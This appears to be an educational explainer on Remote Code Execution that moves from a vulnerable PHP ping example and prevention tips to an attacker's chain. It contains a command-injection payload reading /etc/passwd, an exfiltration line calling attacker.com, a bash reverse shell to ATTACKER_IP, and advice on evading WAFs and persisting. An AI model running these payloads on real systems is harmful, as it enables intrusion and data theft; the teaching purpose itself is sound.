## 📌 What is RCE?

**Remote Code Execution (RCE)** is a security vulnerability that allows an attacker to **run arbitrary code** on a target system **from a remote location** — without physical access.

- “Remote” → The attacker can be anywhere on the network or internet.
- “Code Execution” → They can run commands or programs on the target.

Once exploited, RCE can give the attacker the same privileges as the vulnerable application — sometimes even full system control.

---

## 🛠 How RCE Happens

RCE usually occurs when:

- **User input** is passed to a function that executes code or system commands.
- The application **fails to validate or sanitize** that input.
- The attacker injects malicious code or commands into that input.

  **Common causes** :

1. **Command Injection** — Passing unsanitized input to shell commands.
2. **Code Injection** — Passing unsanitized input into language interpreters (PHP, Python, etc.).
3. **Deserialization Attacks** — Supplying malicious serialized objects that execute code when deserialized.
4. **Remote File Inclusion (RFI)** — Loading and executing code from an attacker-controlled file.
5. **Memory Corruption** — Exploiting buffer overflows or out-of-bounds writes to inject code into memory.

## 🔍 Example Scenario

Imagine a web app with a “ping” feature:

```php
<?php
$host = $_GET['host'];
system("ping -c 4 " . $host);
?>
```

If the attacker sends:

```
host=127.0.0.1; cat /etc/passwd
```

The server will run:

```
ping -c 4 127.0.0.1; cat /etc/passwd
```

→ This executes both the ping and a sensitive file read — a classic RCE via command injection.

## 🎯 What Attackers Can Do with RCE

- **Steal data** (databases, config files, credentials).
- **Install malware** (backdoors, ransomware, cryptominers).
- **Pivot** to other systems in the network.
- **Destroy or alter data** .
- **Take full control** of the server or application.

## 🏆 Types of RCE

| Type           | Description                                                            | Example                                            |
| -------------- | ---------------------------------------------------------------------- | -------------------------------------------------- |
| **Direct RCE** | Output is visible to attacker.                                         | Command injection with visible results in browser. |
| **Blind RCE**  | Output is not visible; attacker uses side channels (OOB, time delays). | `; sleep 5`to detect execution.                    |
| **Stored RCE** | Malicious code is stored and later executed by the system.             | Uploading a malicious script that gets run later.  |

## 🛡 How to Prevent RCE

1. **Never pass raw user input** to system commands or code interpreters.
2. **Use parameterized APIs** instead of shell commands.
3. **Validate and sanitize input** — allowlists > blacklists.
4. **Run with least privilege** — so even if exploited, damage is limited.
5. **Keep software updated** — patch known vulnerabilities.
6. **Use WAF/IDS** to detect and block suspicious patterns.

💡 **In short:**

RCE is like giving a stranger the ability to sit at your server’s keyboard from across the world. It’s one of the most critical vulnerabilities in the OWASP Top 10 because it often leads to **full system compromise** .

---

Perfect — let’s connect the dots between **RCE** and the other techniques we’ve been talking about so you see the _full attack chain_ from base concept to expert-level exploitation.

---

## 🧩 How RCE Fits Into the Bigger Picture

Think of **RCE** as the _door_ into a system.

Once you have it, you can choose what to do next — and that’s where techniques like **command injection** , **out‑of‑band exfiltration** , and **reverse shells** come into play.

---

### 1️⃣ **Entry Point** — Finding the RCE

- **Command Injection** : The most common web-based path to RCE.

  Example: a vulnerable `ping` form that lets you append `; whoami`.

- **Code Injection** : Supplying malicious code to be executed by the app’s interpreter (PHP, Python, etc.).
- **Deserialization** : Sending crafted serialized objects that execute code when loaded.
- **File Inclusion** : Getting the server to load and run your code from a remote or local file.

---

### 2️⃣ **Execution Style**

- **Direct RCE** : You see the output right away (easy to confirm).
- **Blind RCE** : No output — you need indirect confirmation.
- **Stored RCE** : Your payload is saved and executed later.

---

### 3️⃣ **Blind RCE → Out‑of‑Band (OOB)**

If you can’t see the output:

- Use **OOB techniques** to make the target send data to you.
- Example:

  ```bash
  wget http://attacker.com/$(whoami)
  ```

  → The target connects to your server, embedding the username in the request.

---

### 4️⃣ **Post‑Exploitation — Reverse Shell**

Once you confirm RCE, you can:

- Spawn a **reverse shell** so you have a live, interactive terminal.
- Example:
  ```bash
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  ```
- This lets you explore, escalate privileges, and pivot to other systems.

---

### 5️⃣ **Data Exfiltration**

With RCE + shell access, you can:

- Steal sensitive files (`/etc/passwd`, database dumps).
- Use OOB channels (HTTP, DNS) to smuggle data out if direct download is blocked.
- Encode data to bypass filters (Base64, hex).

---

## 🏆 Expert-Level Considerations

- **Protocol Choice** : Use HTTP/HTTPS for stealth, DNS for bypassing firewalls, or custom protocols for speed.
- **Payload Obfuscation** : Encode or split payloads to evade WAFs.
- **Privilege Escalation** : Move from low-privilege shell to root/admin.
- **Pivoting** : Use the compromised host to reach deeper into the network.
- **Persistence** : Install a backdoor or scheduled job to maintain access.

---

💡 **In short:**

- **RCE** is the vulnerability.
- **Command Injection** is one way to get it.
- **OOB** helps when it’s blind.
- **Reverse Shells** give you full interactive control.
- **Data Exfiltration** is often the end goal.
